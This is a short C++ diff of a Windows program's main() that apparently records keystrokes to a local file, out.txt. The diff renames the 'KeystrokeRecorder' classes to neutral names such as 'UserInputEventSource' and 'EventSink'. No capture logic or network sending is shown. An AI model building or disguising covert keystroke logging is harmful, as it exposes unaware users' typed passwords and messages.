@@ -1,15 +1,15 @@
 #include <iostream>
-#include "keystroke_recorder.h"
-#include "snapshot_stream.h"
-
+#include "user_input_event_source.h"
+#include "event_sink.h"
 #include "WinUser.h"
 
 int main()
 {
-    auto snapshotStream = std::make_shared<SnapshotStream>("out.txt");
+    EventSink eventSink = EventSink("out.txt");
 
-    KeystrokeRecorder *keystrokeRecorder = KeystrokeRecorder::getInstance();
-    keystrokeRecorder->registerRecorder(snapshotStream);
+    UserInputEventSource *keystrokeRecorder = UserInputEventSource::getInstance();
+
+    eventSink.addSource(keystrokeRecorder);
 
     BOOL ret;
     MSG msg;
